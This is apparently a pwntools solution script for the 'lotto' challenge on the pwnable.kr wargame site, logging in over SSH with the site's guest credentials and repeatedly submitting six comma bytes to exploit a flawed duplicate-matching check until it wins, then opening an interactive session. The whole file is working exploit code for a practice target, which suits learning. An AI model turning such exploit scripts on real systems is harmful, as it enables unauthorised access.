from pwn import *

ssh = ssh(
    	user = 'lotto',
    	host ='pwnable.kr',
    	password = 'guest',
    	port = 2222)
p = ssh.process('./lotto')

while True:
	p.sendline(b'1')
	payload = b',,,,,,' # choose 6 character from 1 to 45 in ACSII  
	p.sendlineafter(b'Submit your 6 lotto bytes :',payload)

	lotto_start = p.recvline()
	print(lotto_start)
	result = p.recvline()
	print(result)
	if b"bad luck" not in result :
		break

p.interactive()
    
